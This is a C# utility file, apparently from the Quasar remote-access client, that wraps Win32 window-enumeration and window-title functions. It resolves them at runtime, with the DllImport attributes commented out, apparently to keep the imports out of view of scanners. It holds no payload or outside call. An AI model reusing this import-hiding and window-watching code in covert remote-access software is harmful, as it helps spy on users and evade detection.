﻿using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Quasar.Client.Utilities
{
    /// <summary>
    /// Provides access to the Win32 API.
    /// </summary>
    internal static partial class ClientNatives
    {
        //[DllImport("user32.dll")]
        internal delegate bool EnumDesktopWindowsFunc(IntPtr hDesktop, EnumDesktopWindowsProc callback, IntPtr lParam);
        internal static bool EnumDesktopWindows(IntPtr hDesktop, EnumDesktopWindowsProc callback, IntPtr lParam) => Lookup<EnumDesktopWindowsFunc>("user32.dll", "EnumDesktopWindows")(hDesktop, callback
            , lParam);

        //[DllImport("user32.dll")]
        internal delegate bool IsWindowVisibleFunc(IntPtr hWnd);
        internal static bool IsWindowVisible(IntPtr hWnd) => Lookup<IsWindowVisibleFunc>("user32.dll", "IsWindowVisible")(hWnd);

        //[DllImport("user32.dll")]
        internal delegate IntPtr GetForegroundWindowFunc();
        internal static IntPtr GetForegroundWindow() => Lookup<GetForegroundWindowFunc>("user32.dll", "GetForegroundWindow")();

        //[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal delegate int GetWindowTextFunc(IntPtr hWnd, [MarshalAs(UnmanagedType.LPWStr)] StringBuilder lpString, int nMaxCount);
        internal static int GetWindowText(IntPtr hWnd, [MarshalAs(UnmanagedType.LPWStr)] StringBuilder lpString, int nMaxCount) => Lookup<GetWindowTextFunc>("user32.dll", "GetWindowTextW")(hWnd, lpString, nMaxCount);

        internal delegate bool EnumDesktopWindowsProc(IntPtr hDesktop, IntPtr lParam);

        /// <summary>
        ///     Retrieves the identifier of the thread that created the specified window and, optionally, the identifier of the
        ///     process that
        ///     created the window.
        /// </summary>
        /// <param name="handle">A handle to the window. </param>
        /// <param name="processId">
        ///     A pointer to a variable that receives the process identifier. If this parameter is not NULL,
        ///     GetWindowThreadProcessId copies the identifier of the process to the variable; otherwise, it does not.
        /// </param>
        /// <returns>The return value is the identifier of the thread that created the window. </returns>
        //[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        internal delegate int GetWindowThreadProcessIdProc(IntPtr handle, out int processId);
        internal static int GetWindowThreadProcessId(IntPtr handle, out int processId) => ClientNatives.Lookup<GetWindowThreadProcessIdProc>("user32.dll", "GetWindowThreadProcessId")(handle, out processId);
    }
}
